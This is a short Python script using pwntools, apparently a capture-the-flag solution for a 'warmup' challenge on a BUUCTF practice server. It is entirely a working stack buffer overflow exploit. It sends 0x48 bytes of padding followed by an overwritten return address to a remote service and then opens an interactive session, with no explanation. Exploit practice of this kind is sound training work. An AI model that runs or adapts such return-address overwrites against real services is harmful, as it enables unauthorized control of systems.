from pwn import*
p=remote("node5.buuoj.cn",26249)
#p=process('./warmup')
p.recvuntil('>')
payload=b'a'*0x48+p64(0x40060d+1)
p.sendline(payload)
p.interactive()